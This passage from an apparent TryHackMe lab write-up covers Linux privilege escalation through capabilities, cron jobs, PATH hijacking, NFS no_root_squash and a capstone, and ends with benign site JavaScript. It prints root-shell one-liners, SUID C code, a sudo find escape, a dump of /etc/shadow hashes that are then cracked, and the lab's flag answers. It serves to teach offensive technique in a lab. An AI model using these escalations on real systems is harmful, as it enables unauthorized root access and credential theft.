+The capabilities man page provides detailed information on its usage and options.</p>
+
+<p>We can use the <code class="language-plaintext highlighter-rouge">getcap</code> tool to list enabled capabilities.</p>
+
+<p>When run as an unprivileged user, <code class="language-plaintext highlighter-rouge">getcap -r /</code> will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.</p>
+
+<h3 id="questions-4">Questions</h3>
+
+<p>Q: How many binaries have set capabilities?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_18-46.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">6</code></p>
+
+<p>Q: What other binary can be used through its capabilities?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">view</code></p>
+
+<p>Q: What is the content of the flag4.txt file?</p>
+
+<p>Use <code class="language-plaintext highlighter-rouge">./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code> to get a root shell.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-9349843</code></p>
+
+<h2 id="privilege-escalation-cron-jobs">Privilege Escalation: Cron Jobs</h2>
+
+<p>Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.<br />
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.</p>
+
+<p>Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.</p>
+
+<p>Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.</p>
+
+<p>Any user can read the file keeping system-wide cron jobs under <code class="language-plaintext highlighter-rouge">/etc/crontab</code>.</p>
+
+<p>Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:</p>
+
+<ol>
+  <li>System administrators need to run a script at regular intervals.</li>
+  <li>They create a cron job to do this</li>
+  <li>After a while, the script becomes useless, and they delete it</li>
+  <li>They do not clean the relevant cron job</li>
+</ol>
+
+<p>This change management issue leads to a potential exploit leveraging cron jobs.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/SovymJL.png" alt="" /></p>
+
+<p>The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.<br />
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.</p>
+
+<p>The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.<br />
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.</p>
+
+<h3 id="questions-5">Questions</h3>
+
+<p>We observe four user-defined cron jobs:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-18.png" alt="" /></p>
+
+<p>We are going to use <code class="language-plaintext highlighter-rouge">backup.sh</code> to elevate our privileges. Currently, the script contains this:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-20.png" alt="" /></p>
+
+<p>We will modify it to contain some code that will send us a reverse shell:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-33.png" alt="" /></p>
+
+<p>Q: How many user-defined cron jobs can you see on the target system?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">4</code></p>
+
+<p>Q: What is the content of the flag5.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-38300283</code></p>
+
+<p>Q: What is Matt’s password?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">123456</code></p>
+
+<h2 id="privilege-escalation-path">Privilege Escalation: PATH</h2>
+
+<p>If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH.</p>
+
+<p>If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.</p>
+
+<ol>
+  <li>What folders are located under $PATH</li>
+  <li>Does your current user have write privileges for any of these folders?</li>
+  <li>Can you modify $PATH?</li>
+  <li>Is there a script/application you can start that will be affected by this vulnerability?</li>
+</ol>
+
+<p>For demo purposes, we will use the script below:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/qX7m2Jq.png" alt="" /></p>
+
+<p>This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
+We compile this into an executable and set the SUID bit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc oath_exp.c <span class="nt">-o</span> path <span class="nt">-w</span>
+<span class="nb">chmod </span>u+s path
+</code></pre></div></div>
+
+<p>Our user now has access to the “path” script with SUID bit set.</p>
+
+<p>Once executed “path” will look for an executable named “thm” inside folders listed under PATH.</p>
+
+<p>If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege</p>
+
+<p>A simple search for writable folders can done using the “<code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null</code>” command.</p>
+
+<p>Comparing the output we get, with PATH will help us find folders we could use.</p>
+
+<p>We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/Y3pDsrL.png" alt="" /></p>
+
+<p>An alternative could be the command below.</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u</code></p>
+
+<p>We have added “grep -v proc” to get rid of the many results related to running processes.</p>
+
+<p>Unfortunately, subfolders under /usr are not writable</p>
+
+<p>The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “<code class="language-plaintext highlighter-rouge">export PATH=/tmp:$PATH</code>” command accomplishes this.</p>
+
+<p>At this point the path script will also look under the /tmp folder for an executable named “thm”.</p>
+
+<p>Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/7UdrEnd.png" alt="" /></p>
+
+<p>We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.</p>
+
+<h3 id="questions-6">Questions</h3>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-37.png" alt="" /></p>
+
+<p>We have writable permissions in the following directories:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-42.png" alt="" /></p>
+
+<p>If we look only under <code class="language-plaintext highlighter-rouge">/home</code>, we find a weird directory:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-49.png" alt="" /></p>
+
+<p>Checking out the directory:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-53.png" alt="" /></p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-07.png" alt="" /></p>
+
+<p>We analyze the <code class="language-plaintext highlighter-rouge">test</code> file and see that it is a binary, created by root. If we try to execute it, we see that it cannot find a binary called <code class="language-plaintext highlighter-rouge">thm</code>, to which it is dependent:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-55.png" alt="" /></p>
+
+<p>We add the directory to the <code class="language-plaintext highlighter-rouge">$PATH</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_20-58.png" alt="" /></p>
+
+<p>Created a <code class="language-plaintext highlighter-rouge">thm</code> binary file that simply runs a shell. Then we run <code class="language-plaintext highlighter-rouge">test</code> and we get a root shell:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-06.png" alt="" /></p>
+
+<p>Q: What is the odd folder you have write access for?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">/home/murdoch</code></p>
+
+<p>Q: What is the content of the flag6.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-736628929</code></p>
+
+<h2 id="privilege-escalation-nfs">Privilege Escalation: NFS</h2>
+
+<p>![](Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.</p>
+
+<p>Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.</p>
+
+<p>NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.)</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/irDQTze.png" alt="" /></p>
+
+<p>The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.</p>
+
+<p>We will start by enumerating mountable shares from our attacking machine.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/CmXPDcv.png" alt="" /></p>
+
+<p>We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/DwAB1qs.png" alt="" /></p>
+
+<p>As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Once we compile the code we will set the SUID bit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc nfs.c <span class="nt">-o</span> nfs <span class="nt">-w</span>
+<span class="nb">chmod</span> +s nfs
+<span class="nb">ls</span> <span class="nt">-l</span> nfs
+</code></pre></div></div>
+
+<p>You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/U7IjT38.png" alt="" /></p>
+
+<p>Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.</p>
+
+<h3 id="questions-7">Questions</h3>
+
+<p>We first enumarate the shares:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-16.png" alt="" /></p>
+
+<p>All of them have the <code class="language-plaintext highlighter-rouge">no_root_squash</code> option enabled.</p>
+
+<p>We enumarate the mountable shares from our machine:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-18.png" alt="" /></p>
+
+<p>We mount <code class="language-plaintext highlighter-rouge">/tmp</code> (because as <code class="language-plaintext highlighter-rouge">karen</code>, we have writable access there) share to our machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># create share directory on local machine</span>
+<span class="nb">mkdir</span> /tmp/lol
+<span class="c"># mount the /tmp share from the remote machine</span>
+mount <span class="nt">-o</span> rw 10.129.186.223:/home/newFolder /tmp/lol
+</code></pre></div></div>
+
+<p>Make sure you create <code class="language-plaintext highlighter-rouge">newFolder</code> directory under <code class="language-plaintext highlighter-rouge">/tmp</code> in the remote machine, first!</p>
+
+<p>We create a binary on our local machine under <code class="language-plaintext highlighter-rouge">/tmp/lol</code> with the SUID set:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// lol.c</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc lol.c <span class="nt">-o</span> lol <span class="nt">-w</span>
+<span class="nb">chmod</span> +s lol
+</code></pre></div></div>
+
+<p>If done right, you should see the two files (<code class="language-plaintext highlighter-rouge">lol.c</code> and <code class="language-plaintext highlighter-rouge">lol</code>) under <code class="language-plaintext highlighter-rouge">/tmp/newFolder</code> on the remote machine. What needs to be done is to run the binary there:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-34.png" alt="" /></p>
+
+<p>Q: How many mountable shares can you identify on the target system?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">3</code></p>
+
+<p>Q: How many shares have the “no_root_squash” option enabled?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">3</code></p>
+
+<p>Q: What is the content of the flag7.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-89384012</code></p>
+
+<h2 id="capstone-challenge">Capstone Challenge</h2>
+
+<p>We login and try to gather some data about our user, groups and OS/kernel info:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-41.png" alt="" /></p>
+
+<p>The command <code class="language-plaintext highlighter-rouge">cat /etc/exports</code> returned no results, thus there is no NFS server installed.</p>
+
+<p>There are no cron jobs:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-46.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">getcap -r 2&gt;/dev/null</code> -&gt; returned no results, thus no files with capabilities.</p>
+
+<p>We cannot run <code class="language-plaintext highlighter-rouge">sudo -l</code>. Finally, let us try to find files with the SUID set.</p>
+
+<p>And we find an old friend:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_21-50.png" alt="" /></p>
+
+<p>Let us try to get the contents of <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and <code class="language-plaintext highlighter-rouge">/etc/passwd</code> using the command <code class="language-plaintext highlighter-rouge">base64 file | base64 -d</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+shutdown:*:18353:0:99999:7:::
+halt:*:18353:0:99999:7:::
+mail:*:18353:0:99999:7:::
+operator:*:18353:0:99999:7:::
+games:*:18353:0:99999:7:::
+ftp:*:18353:0:99999:7:::
+nobody:*:18353:0:99999:7:::
+pegasus:!!:18785::::::
+systemd-network:!!:18785::::::
+dbus:!!:18785::::::
+polkitd:!!:18785::::::
+colord:!!:18785::::::
+unbound:!!:18785::::::
+libstoragemgmt:!!:18785::::::
+saslauth:!!:18785::::::
+rpc:!!:18785:0:99999:7:::
+gluster:!!:18785::::::
+abrt:!!:18785::::::
+postfix:!!:18785::::::
+setroubleshoot:!!:18785::::::
+rtkit:!!:18785::::::
+pulse:!!:18785::::::
+radvd:!!:18785::::::
+chrony:!!:18785::::::
+saned:!!:18785::::::
+apache:!!:18785::::::
+qemu:!!:18785::::::
+ntp:!!:18785::::::
+tss:!!:18785::::::
+sssd:!!:18785::::::
+usbmuxd:!!:18785::::::
+geoclue:!!:18785::::::
+gdm:!!:18785::::::
+rpcuser:!!:18785::::::
+nfsnobody:!!:18785::::::
+gnome-initial-setup:!!:18785::::::
+pcp:!!:18785::::::
+sshd:!!:18785::::::
+avahi:!!:18785::::::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+colord:x:998:995:User for colord:/var/lib/colord:/sbin/nologin
+unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+libstoragemgmt:x:996:993:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+gluster:x:994:992:GlusterFS daemons:/run/gluster:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+setroubleshoot:x:993:990::/var/lib/setroubleshoot:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+chrony:x:992:987::/var/lib/chrony:/sbin/nologin
+saned:x:991:986:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+sssd:x:990:984:User for sssd:/:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+geoclue:x:989:983:User for geoclue:/var/lib/geoclue:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
+pcp:x:987:981:Performance Co-Pilot:/var/lib/pcp:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+oprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+missy:x:1001:1001::/home/missy:/bin/bash
+</code></pre></div></div>
+
+<p>We copy only <code class="language-plaintext highlighter-rouge">missy</code>s data and we try to crack the hash using <code class="language-plaintext highlighter-rouge">john</code>.</p>
+
+<p>Fortunately, we were able to do just that:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_22-26.png" alt="" /></p>
+
+<p>We switch users to <code class="language-plaintext highlighter-rouge">missy</code> and we search for the first flag:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_22-28.png" alt="" /></p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> reveals that <code class="language-plaintext highlighter-rouge">missy</code> can run <code class="language-plaintext highlighter-rouge">find</code> with higher privileges:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_22-29.png" alt="" /></p>
+
+<p>We used this to elevate our privileges in a previous task by running the command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+</code></pre></div></div>
+
+<p><img src="/tryhackme/PrivilegeEscalation/LinuxPrivilegeEscalation/2026-04-18_22-32.png" alt="" /></p>
+
+<h3 id="questions-8">Questions</h3>
+
+<p>Q: What is the content of the flag1.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-42828719920544</code></p>
+
+<p>Q: What is the content of the flag2.txt file?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-168824782390238</code></p>
+
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
